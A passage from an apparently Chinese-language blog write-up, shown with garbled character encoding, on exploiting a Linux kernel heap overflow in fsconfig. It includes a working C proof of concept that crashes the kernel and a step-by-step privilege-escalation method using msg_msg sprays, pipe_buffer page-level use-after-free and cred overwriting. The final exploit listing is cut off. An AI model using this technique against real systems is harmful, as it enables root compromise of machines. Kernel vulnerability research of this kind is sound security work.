class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* make an oob-write by fsconfig */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡å †æº¢å‡ºé€ æˆ kernel panicï¼š</p><p><img src="https://s2.loli.net/2023/01/08/KmX1LNFrDQPpd9u.png" alt="image.png"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>ä¸‹é¢ç¬”è€…ç»™å‡ºä¸¤ç§åˆ©ç”¨æ–¹æ³•ï¼Œå…¶ä¸­ç¬¬äºŒé‡å°šæœªç»è¿‡éªŒè¯ï¼ˆä¸è¿‡ç†è®ºä¸Šå¯è¡Œï¼‰</p><h2 id="æ–¹æ³•ä¸€ã€è¦†å†™-pipe-buffer-æ„é€ é¡µçº§-UAF"><a href="#æ–¹æ³•ä¸€ã€è¦†å†™-pipe-buffer-æ„é€ é¡µçº§-UAF" class="headerlink" title="æ–¹æ³•ä¸€ã€è¦†å†™ pipe_buffer æ„é€ é¡µçº§ UAF"></a>æ–¹æ³•ä¸€ã€è¦†å†™ <code>pipe_buffer</code> æ„é€ é¡µçº§ UAF</h2><blockquote><p>è™½ç„¶è¿™ç¯‡åšå®¢å†™äº 1 æœˆï¼Œä½†æ˜¯è¿™ä¸ªé€šç”¨åˆ©ç”¨æ–¹æ³•ç¬”è€…æœ€åˆå…¬å¼€äº 4 æœˆä»½çš„ <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023-d3kcache</a> ä¸­ï¼Œåé¢æƒ³äº†æƒ³ç”¨åœ¨è¿™ä¸ªæ¼æ´ä¸Šä¹Ÿæ˜¯æŒºå¥½çš„ï¼Œæ‰€ä»¥ç°åœ¨ç»™å‡ºä¸€ä»½ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œåˆ©ç”¨çš„ exp ï¼šï¼‰</p></blockquote><h3 id="Step-I-åˆ©ç”¨-msg-msg-å®šä½æº¢å‡ºä½ç½®"><a href="#Step-I-åˆ©ç”¨-msg-msg-å®šä½æº¢å‡ºä½ç½®" class="headerlink" title="Step.I - åˆ©ç”¨ msg_msg å®šä½æº¢å‡ºä½ç½®"></a>Step.I - åˆ©ç”¨ <code>msg_msg</code> å®šä½æº¢å‡ºä½ç½®</h3><p>ç”±äºä¸‹æ¬¡å†™å…¥å¿…å®šä¼šå‘ä¸‹ä¸€ä¸ªå¯¹è±¡å†…å†™å…¥ä¸€ä¸ª <code>&#39;=&#39;</code> å’Œä¸€ä¸ª <code>&#39;\0&#39;</code> ï¼Œè€Œè¿™ä¸ª <code>&#39;=&#39;</code> å°±å¾ˆä¸å¯çˆ±ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©<strong>ä¸ç›´æ¥åˆ©ç”¨ä¸å…¶ç›¸é‚»çš„ç¬¬ä¸€ä¸ª 4k å¯¹è±¡ï¼Œè€Œæ˜¯è¦†å†™ä¸å…¶ç›¸é‚»çš„ç¬¬äºŒä¸ª 4k å¯¹è±¡</strong>ï¼Œè¿™æ ·æˆ‘ä»¬ä¾¿èƒ½åªå‘ç¬¬äºŒä¸ª 4k å¯¹è±¡å†…å†™å…¥ä¸€ä¸ªå¯çˆ±çš„ <code>\x00</code> ï¼šï¼‰</p><p>è¿™é‡Œç¬”è€…é€‰æ‹©é¦–å…ˆå †å–· <code>msg_msg</code>ï¼Œåˆ©ç”¨æ¼æ´å°† <code>m_ts</code> æ”¹å¤§ï¼Œé€šè¿‡ <code>MSG_COPY</code> è¯»å–æ£€æŸ¥è¢«è¦†å†™çš„ <code>msg_msg</code> å¹¶<strong>é‡Šæ”¾é™¤äº†è¯¥ msg_msg ä»¥å¤–çš„å…¶ä»– msg_msg</strong></p><h3 id="Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œæ„é€ é¡µçº§-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œæ„é€ é¡µçº§-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œæ„é€ é¡µçº§ UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œæ„é€ é¡µçº§ UAF</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘æº¢å‡ºçš„ç›®æ ‡å¯¹è±¡ï¼Œç°åœ¨æˆ‘ä»¬ä»…æƒ³è¦ä½¿ç”¨ä¸€ä¸ª <code>\x00</code> å­—èŠ‚å®Œæˆåˆ©ç”¨ï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€äº›åœ¨ç»“æ„ä½“å¤´éƒ¨ä¾¿æœ‰æŒ‡å‘å…¶ä»–å†…æ ¸å¯¹è±¡çš„æŒ‡é’ˆçš„å†…æ ¸å¯¹è±¡ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ <code>pipe_buffer</code> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„çš„åˆ©ç”¨å¯¹è±¡ï¼Œå…¶å¼€å¤´æœ‰ç€æŒ‡å‘ <code>page</code> ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè€Œ <code>page</code> çš„å¤§å°ä»…ä¸º <code>0x40</code> ï¼Œå¯ä»¥è¢« 0x100 æ•´é™¤ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿ<strong>é€šè¿‡ partial overwrite ä½¿å¾—ä¸¤ä¸ªç®¡é“æŒ‡å‘åŒä¸€å¼ é¡µé¢ï¼Œå¹¶é‡Šæ”¾æ‰å…¶ä¸­ä¸€ä¸ª</strong>ï¼Œæˆ‘ä»¬ä¾¿æ„é€ å‡ºäº†<strong>é¡µçº§çš„ UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>åŒæ—¶<strong>ç®¡é“çš„ç‰¹æ€§è¿˜èƒ½è®©æˆ‘ä»¬åœ¨ UAF é¡µé¢ä¸Šä»»æ„è¯»å†™</strong>ï¼Œè¿™çœŸæ˜¯å†ç¾å¦™ä¸è¿‡äº†ï¼šï¼‰</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªå°é—®é¢˜ï¼Œ<code>pipe_buffer</code> æ¥è‡ªäº <code>kmalloc-cg-1k</code> ï¼Œå…¶ä¼šè¯·æ±‚ order-2 çš„é¡µé¢ï¼Œè€Œæ¼æ´å¯¹è±¡å¤§å°ä¸º 4kï¼Œå…¶ä¼šè¯·æ±‚ order-3 çš„é¡µé¢ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¿›è¡Œä¸åŒ order é—´çš„å †é£æ°´çš„è¯ï¼Œåˆ™åˆ©ç”¨æˆåŠŸç‡ä¼šå¤§æ‰“æŠ˜æ‰£ :ï¼ˆ</p><p>ä½† pipe å¯ä»¥è¢«æŒ–æ˜çš„æ½œåŠ›è¿œæ¯”æˆ‘ä»¬æƒ³è±¡ä¸­å¤§å¾—å¤šï¼šï¼‰ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>pipe_buffer</code> çš„åˆ†é…è¿‡ç¨‹ï¼Œå…¶å®é™…ä¸Šæ˜¯å•æ¬¡åˆ†é… <code>pipe_bufs</code> ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åˆ° <code>pipe_buffer</code> <strong>ä¸æ˜¯ä¸€ä¸ªå¸¸é‡è€Œæ˜¯ä¸€ä¸ªå˜é‡</strong>ï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬èƒ½å¦æœ‰æ–¹æ³•ä¿®æ”¹ pipe_buffer çš„æ•°é‡ï¼Ÿ</strong>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œpipe ç³»ç»Ÿè°ƒç”¨éå¸¸è´´å¿ƒåœ°ä¸ºæˆ‘ä»¬æä¾›äº† <code>F_SETPIPE_SZ</code> <strong>è®©æˆ‘ä»¬å¯ä»¥é‡æ–°åˆ†é… pipe_buffer å¹¶æŒ‡å®šå…¶æ•°é‡</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡ fcntl() é‡æ–°åˆ†é…å•ä¸ª pipe çš„ pipe_buffer æ•°é‡ï¼Œ</strong>ï¼š</p><ul><li>å¯¹äºæ¯ä¸ª pipe æˆ‘ä»¬<strong>æŒ‡å®šåˆ†é… 64 ä¸ª pipe_bufferï¼Œä»è€Œä½¿å…¶å‘ kmalloc-cg-2k è¯·æ±‚å¯¹è±¡ï¼Œè€Œè¿™å°†æœ€ç»ˆå‘ buddy system è¯·æ±‚ order-3 çš„é¡µé¢</strong></li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬ä¾¿æˆåŠŸä½¿å¾— <code>pipe_buffer</code> ä¸é¢˜ç›®æ¨¡å—çš„å¯¹è±¡<strong>å¤„åœ¨åŒä¸€ order çš„å†…å­˜é¡µä¸Š</strong>ï¼Œä»è€Œæé«˜ cross-cache overflow çš„æˆåŠŸç‡</p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº page ç»“æ„ä½“çš„å¤§å°ä¸º 0x40ï¼Œå…¶å¯ä»¥è¢« 0x100 æ•´é™¤ï¼Œå› æ­¤è‹¥æˆ‘ä»¬æ‰€æº¢å‡ºçš„ç›®æ ‡ page çš„åœ°å€æœ€åä¸€ä¸ªå­—èŠ‚åˆšå¥½ä¸º <code>\x00</code>ï¼Œ  <em>é‚£å°±ç­‰æ•ˆäºæ²¡æœ‰æº¢å‡º</em>  ï¼Œå› æ­¤å®é™…ä¸Šåˆ©ç”¨æˆåŠŸç‡ä»…ä¸º <code>75% </code> ï¼ˆæ‚²ï¼‰</p><h3 id="Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"><a href="#Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™" class="headerlink" title="Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"></a>Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™</h3><p>æœ‰äº† page-level UAFï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è€ƒè™‘å‘è¿™å¼ é¡µé¢åˆ†é…ä»€ä¹ˆç»“æ„ä½“ä½œä¸ºä¸‹ä¸€é˜¶æ®µçš„ victim object</p><p>ç”±äºç®¡é“æœ¬èº«ä¾¿æä¾›ç»™æˆ‘ä»¬è¯»å†™çš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬åˆèƒ½å¤Ÿè°ƒæ•´ <code>pipe_buffer</code> çš„å¤§å°å¹¶é‡æ–°åˆ†é…ç»“æ„ä½“ï¼Œé‚£ä¹ˆå†æ¬¡é€‰æ‹© <code>pipe_buffer</code> ä½œä¸º victim object ä¾¿æ˜¯å†è‡ªç„¶ä¸è¿‡çš„äº‹æƒ…ï¼šï¼‰</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“<strong>è¯»å– pipe_buffer å†…å®¹ï¼Œä»è€Œæ³„éœ²å‡º pageã€pipe_buf_operations ç­‰æœ‰ç”¨çš„æ•°æ®</strong>ï¼ˆå¯ä»¥åœ¨é‡åˆ†é…å‰é¢„å…ˆå‘ç®¡é“ä¸­å†™å…¥ä¸€å®šé•¿åº¦çš„å†…å®¹ï¼Œä»è€Œå®ç°æ•°æ®è¯»å–ï¼‰ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“ç›´æ¥æ”¹å†™ <code>pipe_buffer</code> ï¼Œå› æ­¤å°†æ¼æ´è½¬åŒ–ä¸º dirty pipe æˆ–è®¸ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„åŠæ³•ï¼ˆè¿™ä¹Ÿæ˜¯æœ¬æ¬¡æ¯”èµ›ä¸­ NU1L æˆ˜é˜Ÿçš„è§£æ³•ï¼‰</p><p>ä½†æ˜¯ pipe çš„å¼ºå¤§ä¹‹å¤„è¿œä¸æ­¢è¿™äº›ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥å¯¹ UAF é¡µé¢ä¸Šçš„ <code>pipe_buffer</code> è¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ç»§ç»­æ„é€ å‡ºç¬¬äºŒçº§çš„ page-level UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿåœ¨ç¬¬ä¸€æ¬¡ UAF æ—¶æˆ‘ä»¬è·å–åˆ°äº† page ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œ page ç»“æ„ä½“çš„å¤§å°å›ºå®šä¸º 0x40ï¼Œ<strong>ä¸”ä¸ç‰©ç†å†…å­˜é¡µä¸€ä¸€å¯¹åº”</strong>ï¼Œè¯•æƒ³è‹¥æ˜¯æˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°ä¿®æ”¹ä¸€ä¸ª pipe çš„ page æŒ‡é’ˆï¼Œ<strong>åˆ™æˆ‘ä»¬ä¾¿èƒ½å®Œæˆå¯¹æ•´ä¸ªå†…å­˜ç©ºé—´çš„ä»»æ„è¯»å†™</strong>ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬è¦å®Œæˆè¿™æ ·çš„ä¸€ä¸ªåˆ©ç”¨ç³»ç»Ÿçš„æ„é€ </p><p>å†æ¬¡é‡æ–°åˆ†é… <code>pipe_buffer</code> ç»“æ„ä½“åˆ°ç¬¬äºŒçº§ page-level UAF é¡µé¢ä¸Šï¼Œ<strong>ç”±äºè¿™å¼ ç‰©ç†é¡µé¢å¯¹åº”çš„ page ç»“æ„ä½“çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è®©è¿™å¼ é¡µé¢ä¸Šçš„ pipe_buffer çš„ page æŒ‡é’ˆæŒ‡å‘è‡ªèº«ï¼Œä»è€Œç›´æ¥å®Œæˆå¯¹è‡ªèº«çš„ä¿®æ”¹</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹ <code>pipe_buffer.offset</code> ä¸ <code>pipe_buffer.len</code> æ¥ç§»åŠ¨ pipe çš„è¯»å†™èµ·å§‹ä½ç½®ï¼Œä»è€Œå®ç°æ— é™å¾ªç¯çš„è¯»å†™ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå˜é‡ä¼šåœ¨å®Œæˆè¯»å†™æ“ä½œåé‡æ–°è¢«èµ‹å€¼ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>ä¸‰ä¸ªç®¡é“</strong>ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªç®¡é“ç”¨ä»¥è¿›è¡Œå†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹å…¶ page æŒ‡é’ˆå®Œæˆ ï¼šï¼‰</li><li>ç¬¬äºŒä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“ï¼Œä½¿å…¶å†™å…¥çš„èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li><li>ç¬¬ä¸‰ä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸€ä¸ªä¸ç¬¬äºŒä¸ªç®¡é“ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªç®¡é“çš„ pipe æŒ‡é’ˆæŒ‡å‘æŒ‡å®šä½ç½®ã€ç¬¬äºŒä¸ªç®¡é“çš„å†™å…¥èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸‰ä¸ªç®¡é“</li></ul><p>é€šè¿‡è¿™ä¸‰ä¸ªç®¡é“ä¹‹é—´äº’ç›¸å¾ªç¯ä¿®æ”¹ï¼Œæˆ‘ä»¬ä¾¿<strong>å®ç°äº†ä¸€ä¸ªå¯ä»¥åœ¨å†…å­˜ç©ºé—´ä¸­è¿›è¡Œè¿‘ä¹æ— é™åˆ¶çš„ä»»æ„è¯»å†™ç³»ç»Ÿ</strong> ï¼šï¼‰</p><h3 id="Step-IV-ææƒ"><a href="#Step-IV-ææƒ" class="headerlink" title="Step.IV - ææƒ"></a>Step.IV - ææƒ</h3><p>æœ‰äº†å†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œææƒä¾¿æ˜¯éå¸¸ç®€ä¾¿çš„ä¸€ä»¶äº‹æƒ…äº†ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©é€šè¿‡ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ task_struct çš„ cred ä¸º init_cred çš„æ–¹å¼æ¥å®Œæˆææƒ</p><p><code>init_cred</code> ä¸ºæœ‰ç€ root æƒé™çš„ credï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å½“å‰è¿›ç¨‹çš„ cred ä¿®æ”¹ä¸ºè¯¥ cred ä»¥å®Œæˆææƒï¼Œè¿™é‡Œiwomå¯ä»¥é€šè¿‡ <code>prctl(PR_SET_NAME, &quot;&quot;);</code> ä¿®æ”¹ <code>task_struct.comm</code> ï¼Œä»è€Œæ–¹ä¾¿æœç´¢å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> åœ¨å†…å­˜ç©ºé—´ä¸­çš„ä½ç½®ï¼šï¼‰</p><p>ä¸è¿‡ <code>init_cred</code> çš„ç¬¦å·æœ‰çš„æ—¶å€™æ˜¯ä¸åœ¨ <code>/proc/kallsyms</code> ä¸­å¯¼å‡ºçš„ï¼Œæˆ‘ä»¬åœ¨è°ƒè¯•æ—¶æœªå¿…èƒ½å¤Ÿè·å¾—å…¶åœ°å€ï¼Œå› æ­¤è¿™é‡Œç¬”è€…é€‰æ‹©é€šè¿‡è§£æ <code>task_struct</code> çš„æ–¹å¼å‘ä¸Šä¸€ç›´æ‰¾åˆ° <code>init</code> è¿›ç¨‹ï¼ˆæ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼‰çš„ <code>task_struct</code> ï¼Œä»è€Œè·å¾— <code>init_cred</code> çš„åœ°å€</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span 